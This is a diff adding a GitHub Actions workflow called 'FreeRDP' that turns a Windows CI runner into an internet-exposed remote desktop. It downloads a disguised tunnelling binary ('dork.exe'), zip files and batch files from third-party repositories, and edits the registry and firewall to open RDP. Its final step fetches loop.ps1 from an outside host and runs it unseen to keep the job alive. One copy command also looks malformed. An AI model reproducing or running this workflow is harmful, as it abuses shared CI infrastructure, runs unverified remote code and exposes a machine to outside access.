@@ -1,0 +1,38 @@
+name: FreeRDP
+
+on: workflow_dispatch
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+    timeout-minutes: 9999
+
+    steps:
+    - name: Downloading Ngrok.
+      run: |
+        Invoke-WebRequest https://github.com/aliasaudary/dork/raw/main/dork.zip -OutFile dork.zip
+        Invoke-WebRequest https://raw.githubusercontent.com/aliasaudary/dork/main/start.bat -OutFile start.bat
+        Invoke-WebRequest https://github.com/aliasaudary/dork/raw/main/ScriptC1.zip -OutFile ScriptC1.zip
+        Invoke-WebRequest https://raw.githubusercontent.com/aliasaudary/dork/main/wallpaper.bat -OutFile wallpaper.bat
+    - name: Extracting Ngrok Files.
+      run: Expand-Archive dork.zip
+    - name: Connecting to your Ngrok account.
+      run: .\dork\dork.exe authtoken $Env:NGROK_AUTH_TOKEN
+      env:
+        NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
+    - name: Activating RDP access.
+      run: | 
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+        copy wallpaper.jpg C:ScriptC1.zip
+        copy wallpaper.bat D:\a\wallpaper.bat
+    - name: Creating Tunnel.
+      run: Start-Process Powershell -ArgumentList '-Noexit -Command ".\dork\dork.exe tcp --region ap 3389"'
+    - name: Connecting to your RDP.
+      run: cmd /c start.bat
+    - name: RDP is ready!
+      run: | 
+        Invoke-WebRequest https://try.gitea.io/gairmeet/chuax/raw/branch/master/loop.ps1 -OutFile loop.ps1
+        ./loop.ps1
